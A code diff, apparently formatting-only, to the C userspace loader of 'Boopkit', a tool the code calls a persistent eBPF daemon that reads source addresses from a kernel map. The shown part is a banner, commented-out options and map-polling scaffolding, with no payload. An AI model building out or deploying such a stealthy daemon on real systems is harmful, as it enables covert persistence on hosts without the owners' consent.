@@ -44,40 +44,37 @@
 #define PROBE_SAFE "pr0be.safe.o"
 
 void asciiheader() {
-printf("\n\n");
-printf("   ██████╗  ██████╗  ██████╗ ██████╗ ██╗  ██╗██╗████████╗\n");
-printf("   ██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗██║ ██╔╝██║╚══██╔══╝\n");
-printf("   ██████╔╝██║   ██║██║   ██║██████╔╝█████╔╝ ██║   ██║   \n");
-printf("   ██╔══██╗██║   ██║██║   ██║██╔═══╝ ██╔═██╗ ██║   ██║   \n");
-printf("   ██████╔╝╚██████╔╝╚██████╔╝██║     ██║  ██╗██║   ██║   \n");
-printf("   ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝   ╚═╝   \n");
-printf("\n\n");
+  printf("\n\n");
+  printf("   ██████╗  ██████╗  ██████╗ ██████╗ ██╗  ██╗██╗████████╗\n");
+  printf("   ██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗██║ ██╔╝██║╚══██╔══╝\n");
+  printf("   ██████╔╝██║   ██║██║   ██║██████╔╝█████╔╝ ██║   ██║   \n");
+  printf("   ██╔══██╗██║   ██║██║   ██║██╔═══╝ ██╔═██╗ ██║   ██║   \n");
+  printf("   ██████╔╝╚██████╔╝╚██████╔╝██║     ██║  ██╗██║   ██║   \n");
+  printf("   ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝   ╚═╝   \n");
+  printf("\n\n");
 }
 
 void clisetup(int argc, char **argv) {
   int i = 0;
-  for (i = 0; i < argc; i++)
-  {
-    if (argv[i][0] == '-')
-    {
-      switch (argv[i][1])
-      {
-      case 'v':
-        //Verbose
-        //cfg.verbose = 1;
-        break;
-      case 'h':
-        //Host
-        //cfg.ip = argv[i + 1];
-        break;
-      case 'p':
-        //Port
-        //cfg.port = atoi(argv[i + 1]);
-        break;
-      case 'm':
-        //Message
-        //cfg.message = argv[i + 1];
-        break;
+  for (i = 0; i < argc; i++) {
+    if (argv[i][0] == '-') {
+      switch (argv[i][1]) {
+        case 'v':
+          // Verbose
+          // cfg.verbose = 1;
+          break;
+        case 'h':
+          // Host
+          // cfg.ip = argv[i + 1];
+          break;
+        case 'p':
+          // Port
+          // cfg.port = atoi(argv[i + 1]);
+          break;
+        case 'm':
+          // Message
+          // cfg.message = argv[i + 1];
+          break;
       }
     }
   }
@@ -89,7 +86,6 @@ void clisetup(int argc, char **argv) {
 int main(int argc, char **argv) {
   asciiheader();
   clisetup(argc, argv);
-
 
   printf("-----------------------------------------------\n");
   // Return value for eBPF loading
@@ -157,8 +153,6 @@ int main(int argc, char **argv) {
   int fd = bpf_map__fd(bpmap);
   printf("  -> eBPF Program Linked!\n");
 
-
-
   printf("-----------------------------------------------\n");
   printf("Logs: cat /sys/kernel/tracing/trace_pipe\n");
 
@@ -167,12 +161,11 @@ int main(int argc, char **argv) {
   //
   // Boopkit will run as a persistent daemon in userspace!
   while (1) {
-
     // =========================================================================
     // Boop map management
     //
     int ikey = 0, jkey, err;
-    char saddrval[INET_ADDRSTRLEN]; // Saturn Valley. If you know, you know.
+    char saddrval[INET_ADDRSTRLEN];  // Saturn Valley. If you know, you know.
     struct tcp_return ret;
     while (!bpf_map_get_next_key(fd, &ikey, &jkey)) {
       err = bpf_map_lookup_elem(fd, &ikey, &jkey);
@@ -207,5 +200,3 @@ int main(int argc, char **argv) {
     }
   }
 }
-
-
